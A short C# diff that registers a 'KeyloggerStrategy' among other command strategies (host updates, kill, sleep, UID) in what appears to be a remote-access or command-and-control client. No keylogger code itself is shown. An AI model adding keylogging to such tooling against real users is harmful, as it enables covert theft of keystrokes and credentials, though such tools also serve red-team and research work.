@@ -103,6 +103,7 @@ namespace Client
             builder.Services.AddScoped<UpdateHostsStrategy>();
             builder.Services.AddScoped<KillStrategy>();
             builder.Services.AddScoped<GetUIDStrategy>();
+            builder.Services.AddScoped<KeyloggerStrategy>();
             builder.Services.AddScoped<SetSleepStrategy>();
             builder.Services.AddScoped<HelpStrategy>();
 
